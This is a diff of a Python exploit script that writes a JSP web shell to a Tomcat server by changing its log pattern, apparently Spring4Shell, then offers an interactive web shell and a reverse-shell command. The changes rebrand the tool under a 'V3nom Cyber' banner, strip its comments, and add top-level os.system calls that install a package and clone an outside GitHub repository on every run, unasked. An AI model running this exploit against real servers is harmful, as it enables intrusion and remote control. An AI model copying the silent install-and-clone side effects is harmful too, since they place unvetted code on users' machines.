@@ -5,6 +5,7 @@ import shutil
 import sys
 import threading
 import time
+from colorama import Fore, Back, Style
 from cmd import Cmd
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 from urllib.parse import urlparse
@@ -31,7 +32,7 @@ def start_server(httpd):
 
 
 def stop_server(httpd):
-    httpd.shutdown()  # Hackish way to terminate the thread
+    httpd.shutdown() 
 
 
 class Term(Cmd):
@@ -136,17 +137,20 @@ def run_exploit(url):
     if ret.status_code != 200:
         print(f"[-] Exploit failed [{ret.status_code}]. Cannot modify log configuration")
         sys.exit(1)
-    # Changes take some time to populate on tomcat
+    
     time.sleep(3)
-    # Send the packet that writes the web shell
+    
     requests.get(url, headers=get_headers, verify=False, proxies=proxies)
     time.sleep(1)
-    # Reset the pattern to prevent future writes into the file
+    
     pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
     print("[*] Resetting Log Variables")
     requests.post(url, headers=post_headers, data=pattern_data, verify=False, proxies=proxies)
-    time.sleep(5)  # Sometimes it takes a while to complete the exploit
+    time.sleep(5)  
     return f"{get_host(url, with_scheme=True)}/{filename}.jsp"
+
+os.system("pip install colorama")
+os.system("git clone https://github.com/V3noM-Cyber/V3nomExplot")
 
 
 def main():
@@ -155,18 +159,19 @@ def main():
         sys.exit(-1)
 
     host = sys.argv[1].rstrip("/")
-    print(""" 
+    print(Fore.GREEN+""" 
  ▌ ▐·   ▐ ▄       • ▌ ▄ ·.   ▄▄▄ .▐▄• ▄  ▄▄▄·▄▄▌        ▪  ▄▄▄▄▄  
 ▪█·█▌  •█▌▐█ ▄█▀▄ ·██ ▐███▪  ▀▄.▀· █▌█▌▪▐█ ▄███•   ▄█▀▄ ██ •██    
 ▐█▐█•  ▐█▐▐▌▐█▌.▐▌▐█ ▌▐▌▐█·  ▐▀▀▪▄ ·██·  ██▀·██ ▪ ▐█▌.▐▌▐█· ▐█.▪  
  ███   ██▐█▌▐█▌.▐▌██ ██▌▐█▌  ▐█▄▄▌▪▐█·█▌▐█▪·•▐█▌ ▄▐█▌.▐▌▐█▌ ▐█▌·  
 . ▀    ▀▀ █▪ ▀█▄▀▪▀▀  █▪▀▀▀   ▀▀▀ •▀▀ ▀▀.▀   .▀▀▀  ▀█▄▀▪▀▀▀ ▀▀▀   
+       @exploit V3nom Cyber 
  """)
 
-    print("[*] Running exploit")
+    print("[</>] Running exploit")
     shell = run_exploit(host)
-    print(f"[+] Exploit completed ({shell})")
-    print("[*] Starting the virtual webshell")
+    print(f"[</>] Exploit completed ({shell})")
+    print("[</>] Starting the virtual webshell")
     time.sleep(1)  # Suspense :D
     print("[!] To get a reverse shell run 'revsh <your-ip> <your-port>'")
     term = Term(shell)
